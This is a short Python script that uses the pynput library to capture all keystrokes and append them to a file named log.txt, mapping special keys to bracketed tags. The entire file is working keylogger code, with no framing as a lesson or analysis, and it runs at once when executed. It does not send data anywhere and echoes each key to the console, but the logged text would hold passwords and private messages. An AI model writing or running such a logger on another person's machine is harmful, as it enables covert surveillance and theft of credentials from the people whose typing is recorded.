from pynput.keyboard import Key, Listener

def write_to_file(key):
    try:
        keydata = str(key).replace("'", "")
        print(f"Key pressed: {keydata}")
        if hasattr(key, 'char') and key.char is not None:
            with open("log.txt", 'a') as logKey:
                logKey.write(key.char)
        else:
            key_mapping = {
                Key.space: " ",
                Key.enter: "\n",
                Key.tab: "\t",
                Key.backspace: "[BACKSPACE]",
                Key.shift: "[SHIFT]", Key.shift_l: "[SHIFT]", Key.shift_r: "[SHIFT]",
                Key.ctrl: "[CTRL]", Key.ctrl_l: "[CTRL]", Key.ctrl_r: "[CTRL]",
                Key.alt: "[ALT]", Key.alt_l: "[ALT]", Key.alt_r: "[ALT]",
                Key.caps_lock: "[CAPSLOCK]",
                Key.esc: "[ESC]",
                Key.up: "[UP ARROW]",
                Key.down: "[DOWN ARROW]",
                Key.left: "[LEFT ARROW]",
                Key.right: "[RIGHT ARROW]",
                Key.delete: "[DELETE]",
                Key.home: "[HOME]",
                Key.end: "[END]",
                Key.page_up: "[PAGE UP]",
                Key.page_down: "[PAGE DOWN]",
                Key.insert: "[INSERT]",
                Key.print_screen: "[PRINT SCREEN]",
                Key.pause: "[PAUSE]",
            }

            keydata = key_mapping.get(key, f"[UNKNOWN: {key}]")
            with open("log.txt", 'a') as f:
                f.write(keydata)
                
    except Exception as e:
        print(f"Error: {e}")
        with open("log.txt", 'a') as f:
            f.write(f"[ERROR: {str(e)}]")

with Listener(on_press=write_to_file) as listener:
    listener.join()
